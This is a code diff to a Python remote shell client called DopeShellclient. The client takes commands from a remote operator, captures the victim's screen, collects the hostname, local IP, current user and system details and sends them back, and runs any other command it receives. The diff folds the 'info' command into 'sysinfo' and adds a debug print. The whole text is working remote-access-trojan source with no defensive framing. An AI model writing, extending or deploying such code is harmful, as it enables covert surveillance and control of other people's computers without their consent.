@@ -135,24 +135,10 @@ class DopeShellclient:
                 self.send_data('exiting')
                 break
 
-            elif command.lower() == 'info':
-                try:
-                    hostname = socket.gethostname()
-                    local_ip = socket.gethostbyname(hostname)
-                except:
-                    local_ip = "Unable to fetch IP"
 
-                client_info = (
-                    f"OS: {platform.system()} {platform.release()}\n"
-                    f"Architecture: {platform.machine()}\n"
-                    f"Hostname: {platform.node()}\n"
-                    f"Processor: {platform.processor()}\n"
-                    f"Current User: {getpass.getuser()}\n"
-                    f"Local IP Address: {local_ip}\n"
-                )
-                self.send_data(client_info)
 
             elif command.lower() == 'screenshot':
+                print('screenshot function called')
                 screenshot = ImageGrab.grab()
                 buffer = io.BytesIO()
                 screenshot.save(buffer, format='PNG')
@@ -294,14 +280,23 @@ class DopeShellclient:
                     self.send_data(output)
 
             elif command.lower() == 'sysinfo':
-                sys_info = (
-                    f"System: {platform.system()} {platform.release()}\n"
-                    f"Machine: {platform.machine()}\n"
+                try:
+                    hostname = socket.gethostname()
+                    local_ip = socket.gethostbyname(hostname)
+                except:
+                    local_ip = "Unable to fetch IP"
+
+                client_info = (
+                    f"OS: {platform.system()} {platform.release()}\n"
+                    f"Architecture: {platform.machine()}\n"
+                    f"Hostname: {platform.node()}\n"
                     f"Processor: {platform.processor()}\n"
+                    f"Current User: {getpass.getuser()}\n"
+                    f"Local IP Address: {local_ip}\n"
                     f"RAM: {round(psutil.virtual_memory().total / (1024**3), 2)} GB\n"
                     f"Disk: {round(psutil.disk_usage('/').total / (1024**3), 2)} GB\n"
                 )
-                self.send_data(sys_info)
+                self.send_data(client_info)
 
             else:
                 output = self.execute_command(command)
